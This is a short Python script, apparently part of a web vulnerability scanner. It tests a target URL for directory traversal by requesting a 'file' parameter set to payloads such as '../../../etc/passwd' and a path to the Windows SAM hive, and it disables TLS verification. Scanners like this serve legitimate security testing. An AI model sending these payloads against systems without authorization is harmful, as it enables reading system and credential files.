import warnings
warnings.filterwarnings('ignore')
warnings.simplefilter('ignore')

import requests
import argparse
from urllib.parse import urljoin
from suggestions import print_suggestions

requests.packages.urllib3.disable_warnings()

TRAVERSAL_PAYLOADS = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    'file=../../../etc/passwd'
]

def check_traversal(url):
    """Test for directory traversal."""
    print(f"[*] Testing for directory traversal on {url}")
    
    try:
        for payload in TRAVERSAL_PAYLOADS:
            test_url = f"{url}?file={payload}" if '?' not in url else f"{url}&file={payload}"
            try:
                r = requests.get(test_url, timeout=5, verify=False)
                if 'root:' in r.text or 'Administrator' in r.text or 'etc/passwd' in r.text:
                    finding = "VULNERABILITY: Directory traversal possible"
                    print(f"[+] {finding}")
                    print_suggestions(finding)
                    break
            except Exception:
                pass
    
    except Exception as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Test for directory traversal.")
    parser.add_argument("url", help="Target URL or domain (e.g., example.com)")
    args = parser.parse_args()
    
    target = args.url if '://' in args.url else 'http://' + args.url
    check_traversal(target)

if __name__ == "__main__":
    main()
